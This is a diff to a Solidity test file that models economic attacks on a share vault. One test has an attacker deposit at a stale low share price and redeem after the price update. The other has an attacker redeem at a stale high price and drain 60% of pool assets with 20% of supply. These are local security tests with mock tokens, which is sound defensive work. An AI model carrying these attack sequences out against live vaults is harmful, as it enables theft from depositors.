@@ -27,6 +27,8 @@ import {ERC7540LikeRedeemQueueHarness} from "test/harnesses/ERC7540LikeRedeemQue
 import {FeeHandlerHarness} from "test/harnesses/FeeHandlerHarness.sol";
 import {ValuationHandlerHarness} from "test/harnesses/ValuationHandlerHarness.sol";
 import {MockERC20} from "test/mocks/MockERC20.sol";
+import {AccountERC20Tracker} from "src/components/value/position-trackers/AccountERC20Tracker.sol";
+import {AccountERC20TrackerHarness} from "test/harnesses/AccountERC20TrackerHarness.sol";
 import {TestHelpers} from "test/utils/TestHelpers.sol";
 
 contract EconomicAttacksTest is Test, TestHelpers {
@@ -55,12 +57,11 @@ contract EconomicAttacksTest is Test, TestHelpers {
         shares.addRedeemHandler(address(redeemQueue));
         vm.stopPrank();
 
-        // Deploy valuation handler
+        // Deploy valuation handler and tracker (track Shares' ERC20 holdings)
         ValuationHandlerHarness valuationHandler = new ValuationHandlerHarness(address(shares));
         vm.prank(admin);
         shares.setValuationHandler(address(valuationHandler));
 
-        // Set asset and rate
         uint8 assetDecimals = 6;
         MockERC20 asset = new MockERC20(assetDecimals);
         vm.startPrank(admin);
@@ -69,67 +70,83 @@ contract EconomicAttacksTest is Test, TestHelpers {
         valuationHandler.setAssetRate(
             ValuationHandler.AssetRateInput({asset: address(asset), rate: uint128(1e18), expiry: uint40(block.timestamp + 1 days)})
         );
+        // Add an ERC20 tracker for Shares' holdings
+        AccountERC20Tracker tracker = AccountERC20Tracker(address(new AccountERC20TrackerHarness(address(shares))));
+        tracker.init(address(shares));
+        tracker.addAsset(address(asset));
+        valuationHandler.addPositionTracker(address(tracker));
         vm.stopPrank();
 
-        // Set stale share value (old)
-        uint256 pOld = 1e18; // 1.0
-        valuationHandler.harness_setLastShareValue({
-            _shareValue: pOld,
-            _timestamp: 1
-        });
-
-        // Controller deposits 1 unit of asset (1e6 units given 6 decimals)
-        address controller = makeAddr("controller:staleDeposit");
-        uint256 depositAssets = 1_000_000; // 1.0 asset
-        asset.mintTo(controller, depositAssets);
-        vm.prank(controller);
+        // Initial LP deposits at fresh price (p_old = 1.0)
+        address lp = makeAddr("lp");
+        uint256 lpAssets = 1_000_000; // 1.0 asset
+        asset.mintTo(lp, lpAssets);
+        vm.startPrank(lp);
         asset.approve(address(depositQueue), type(uint256).max);
-
-        vm.prank(controller);
-        uint256 requestId = depositQueue.requestDeposit({
-            _assets: depositAssets,
-            _controller: controller,
-            _owner: controller
-        });
-
-        // Execute deposit at stale price
-        uint256 preExecuteSharesSupply = shares.totalSupply();
+        uint256 lpReq = depositQueue.requestDeposit({_assets: lpAssets, _controller: lp, _owner: lp});
+        vm.stopPrank();
         vm.prank(admin);
-        depositQueue.executeDepositRequests({_requestIds: _asArray(requestId)});
+        depositQueue.executeDepositRequests(_asArray(lpReq));
 
-        // Minted shares = value / pOld = (assets * 1e12) / pOld, scaled by SHARES_PRECISION
-        // Using library: calcSharesAmountForValue = SHARES_PRECISION * value / valuePerShare
-        uint256 controllerShares = shares.balanceOf(controller);
-        assertGt(controllerShares, 0);
-        assertEq(shares.totalSupply(), preExecuteSharesSupply + controllerShares);
+        // Freshly update share value at p_old = 1.0 (tracked positions only)
+        vm.prank(admin);
+        valuationHandler.updateShareValue(0);
 
-        // Update to a higher true price and pre-seed extra assets required to honor redemption
-        uint256 pTrue = 2e18; // 2.0
-        valuationHandler.harness_setLastShareValue({_shareValue: pTrue, _timestamp: block.timestamp});
+        emit log_named_uint("p_old (share value)", _getShareValue(address(valuationHandler)));
+        emit log_named_uint("supply after LP deposit", shares.totalSupply());
+        emit log_named_uint("Shares asset balance after LP", IERC20(address(asset)).balanceOf(address(shares)));
 
-        // Expected redeemed assets at pTrue: depositAssets * (pTrue / pOld) = 2x
-        uint256 expectedRedeemAssets = depositAssets * pTrue / pOld;
-        // Seed Shares with the additional amount required beyond the deposit
-        uint256 extra = expectedRedeemAssets - depositAssets;
-        asset.mintTo(address(shares), extra);
+        // Off-chain PnL doubles net asset value, but admin does NOT update share value (stale = 1.0)
+        // Attacker deposits while price is stale. We'll keep asset rate constant and realize PnL via untracked later.
+        address attacker = makeAddr("attacker");
+        uint256 attackerAssets = 1_000_000; // 1.0 asset
+        asset.mintTo(attacker, attackerAssets);
+        vm.startPrank(attacker);
+        asset.approve(address(depositQueue), type(uint256).max);
+        uint256 attackerReq = depositQueue.requestDeposit({_assets: attackerAssets, _controller: attacker, _owner: attacker});
+        vm.stopPrank();
 
-        // Request redeem of all shares and execute
-        vm.prank(controller);
+        // Execute attacker deposit at stale p_old = 1.0
+        uint256 supplyBeforeAttacker = shares.totalSupply();
+        vm.prank(admin);
+        depositQueue.executeDepositRequests(_asArray(attackerReq));
+        uint256 attackerShares = shares.balanceOf(attacker);
+
+        emit log_named_uint("attacker minted shares (stale)", attackerShares);
+        emit log_named_uint("supply after attacker deposit", shares.totalSupply());
+
+        // Now admin updates share value to p_true = 2.0 using untrackedPositionsValue
+        // tracked value = (lpAssets + attackerAssets) in value units (rate = 1e18) = 2e18
+        // total supply after attacker deposit = 2e18 (1.0 + 1.0)
+        // To set p_true = 2e18: totalPositionsValue must be p_true * supply / 1e18 = 2e18 * 2e18 / 1e18 = 4e18
+        // So untrackedPositionsValue = 4e18 - tracked(2e18) = 2e18
+        uint256 untrackedToTwoX = 2e18;
+        vm.prank(admin);
+        valuationHandler.updateShareValue(int256(untrackedToTwoX));
+        emit log_named_uint("p_true (updated share value)", _getShareValue(address(valuationHandler)));
+
+        // Attacker redeems all their shares
+        vm.startPrank(attacker);
         shares.approve(address(redeemQueue), type(uint256).max);
+        uint256 redeemId = redeemQueue.requestRedeem({_shares: attackerShares, _controller: attacker, _owner: attacker});
+        vm.stopPrank();
 
-        vm.prank(controller);
-        uint256 redeemId = redeemQueue.requestRedeem({
-            _shares: controllerShares,
-            _controller: controller,
-            _owner: controller
-        });
+        uint256 attackerAssetBefore = IERC20(address(asset)).balanceOf(attacker);
+        uint256 sharesAssetBefore = IERC20(address(asset)).balanceOf(address(shares));
+        emit log_named_uint("attacker asset before redeem", attackerAssetBefore);
+        emit log_named_uint("Shares asset balance before redeem", sharesAssetBefore);
 
         vm.prank(admin);
-        redeemQueue.executeRedeemRequests({_requestIds: _asArray(redeemId)});
+        redeemQueue.executeRedeemRequests(_asArray(redeemId));
 
-        // Profit should be depositAssets (2x payout)
-        assertEq(IERC20(address(asset)).balanceOf(controller), expectedRedeemAssets);
-        assertEq(IERC20(address(asset)).balanceOf(address(shares)), 0);
+        uint256 attackerAssetAfter = IERC20(address(asset)).balanceOf(attacker);
+        uint256 sharesAssetAfter = IERC20(address(asset)).balanceOf(address(shares));
+        emit log_named_uint("attacker asset after redeem", attackerAssetAfter);
+        emit log_named_uint("Shares asset balance after redeem", sharesAssetAfter);
+
+        // Attacker drained the pool beyond their contribution (profit = attackerAssets)
+        assertEq(attackerAssetAfter - attackerAssetBefore, attackerAssets * 2); // received 2.0 assets
+        assertEq(sharesAssetAfter, 0);
     }
 
     //==================================================================================================================
@@ -138,51 +155,81 @@ contract EconomicAttacksTest is Test, TestHelpers {
 
     function test_staleRedeem_overpayout() public {
         // Deploy handlers
+        ERC7540LikeDepositQueueHarness depositQueue = new ERC7540LikeDepositQueueHarness(address(shares));
         ERC7540LikeRedeemQueueHarness redeemQueue = new ERC7540LikeRedeemQueueHarness(address(shares));
-        vm.prank(admin);
+        vm.startPrank(admin);
+        shares.addDepositHandler(address(depositQueue));
         shares.addRedeemHandler(address(redeemQueue));
+        vm.stopPrank();
 
-        // Deploy valuation handler
+        // Deploy valuation handler and tracker
         ValuationHandlerHarness valuationHandler = new ValuationHandlerHarness(address(shares));
         vm.prank(admin);
         shares.setValuationHandler(address(valuationHandler));
 
-        // Set asset and rate
         uint8 assetDecimals = 6;
         MockERC20 asset = new MockERC20(assetDecimals);
-        vm.prank(admin);
+        vm.startPrank(admin);
+        depositQueue.setAsset(address(asset));
         redeemQueue.setAsset(address(asset));
-        vm.prank(admin);
         valuationHandler.setAssetRate(
             ValuationHandler.AssetRateInput({asset: address(asset), rate: uint128(1e18), expiry: uint40(block.timestamp + 1 days)})
         );
+        AccountERC20Tracker tracker = AccountERC20Tracker(address(new AccountERC20TrackerHarness(address(shares))));
+        tracker.init(address(shares));
+        tracker.addAsset(address(asset));
+        valuationHandler.addPositionTracker(address(tracker));
+        vm.stopPrank();
 
-        // Set stale-high price
-        uint256 pOld = 3e18; // 3.0 (stale high)
-        valuationHandler.harness_setLastShareValue({_shareValue: pOld, _timestamp: 1});
+        // Initial LP deposit (creates supply and funds pool)
+        address lp = makeAddr("lp:redeem");
+        uint256 lpAssets = 1_000_000; // 1.0 asset
+        asset.mintTo(lp, lpAssets);
+        vm.startPrank(lp);
+        asset.approve(address(depositQueue), type(uint256).max);
+        uint256 lpReq = depositQueue.requestDeposit({_assets: lpAssets, _controller: lp, _owner: lp});
+        vm.stopPrank();
+        vm.prank(admin);
+        depositQueue.executeDepositRequests(_asArray(lpReq));
 
-        // Seed user shares (bypassing issuance for simplicity) and seed Shares with assets to pay out
-        address controller = makeAddr("controller:staleRedeem");
-        uint256 sharesAmount = 1e18; // 1.0 share
-        deal(address(shares), controller, sharesAmount, true);
+        // Fresh share value at 1.0
+        vm.prank(admin);
+        valuationHandler.updateShareValue(0);
+        emit log_named_uint("fresh share value", _getShareValue(address(valuationHandler)));
 
-        // Expected assets using stale-high price: value = shares * pOld / 1e18; assets = value * 1e6 / 1e18
-        uint256 expectedAssets = (sharesAmount * pOld / SHARES_PRECISION) * (10 ** assetDecimals) / 1e18;
-        // Seed Shares with the required assets
-        asset.mintTo(address(shares), expectedAssets);
+        // Admin previously updated share value to a high stale value via untracked (e.g., 3.0)
+        // total supply S0 = value/1e18 = 1e18; tracked=1e18; need totalPositions=3e18 => untracked=2e18
+        vm.prank(admin);
+        valuationHandler.updateShareValue(int256(2e18));
+        emit log_named_uint("stale-high share value (stored)", _getShareValue(address(valuationHandler)));
 
-        // Request and execute redeem
-        vm.prank(controller);
+        // Attacker holds a fraction of supply (20%) by acquiring shares beforehand (via test deal for simplicity)
+        address attacker = makeAddr("attacker:redeem");
+        uint256 sharesAmount = shares.totalSupply() / 5; // 20%
+        deal(address(shares), attacker, sharesAmount, true);
+
+        // Redeem using stale-high share value (3.0)
+        vm.startPrank(attacker);
         shares.approve(address(redeemQueue), type(uint256).max);
+        uint256 reqId = redeemQueue.requestRedeem({_shares: sharesAmount, _controller: attacker, _owner: attacker});
+        vm.stopPrank();
 
-        vm.prank(controller);
-        uint256 requestId = redeemQueue.requestRedeem({_shares: sharesAmount, _controller: controller, _owner: controller});
+        uint256 attackerAssetBefore = IERC20(address(asset)).balanceOf(attacker);
+        uint256 sharesAssetBefore = IERC20(address(asset)).balanceOf(address(shares));
+        emit log_named_uint("attacker asset before redeem", attackerAssetBefore);
+        emit log_named_uint("Shares asset balance before redeem", sharesAssetBefore);
 
         vm.prank(admin);
-        redeemQueue.executeRedeemRequests({_requestIds: _asArray(requestId)});
+        redeemQueue.executeRedeemRequests(_asArray(reqId));
 
-        // User receives assets computed from stale-high price
-        assertEq(IERC20(address(asset)).balanceOf(controller), expectedAssets);
+        uint256 attackerAssetAfter = IERC20(address(asset)).balanceOf(attacker);
+        uint256 sharesAssetAfter = IERC20(address(asset)).balanceOf(address(shares));
+        emit log_named_uint("attacker asset after redeem", attackerAssetAfter);
+        emit log_named_uint("Shares asset balance after redeem", sharesAssetAfter);
+
+        // With stale 3.0 share value and 1.0 rate, 20% redemption extracts 60% of pool assets
+        assertEq(attackerAssetAfter - attackerAssetBefore, (lpAssets * 3) / 5);
+        assertEq(sharesAssetAfter, lpAssets - ((lpAssets * 3) / 5));
     }
 
     //==================================================================================================================
@@ -308,6 +355,11 @@ contract EconomicAttacksTest is Test, TestHelpers {
         uint256 quotePrecision = 10 ** quoteDecimals_;
         uint256 basePrecision = 1e18;
         return (value_ * ratePrecision * quotePrecision) / (rate_ * basePrecision);
+    }
+
+    function _getShareValue(address valuationHandler_) internal view returns (uint256) {
+        (uint256 v,) = ValuationHandler(valuationHandler_).getShareValue();
+        return v;
     }
 }
 
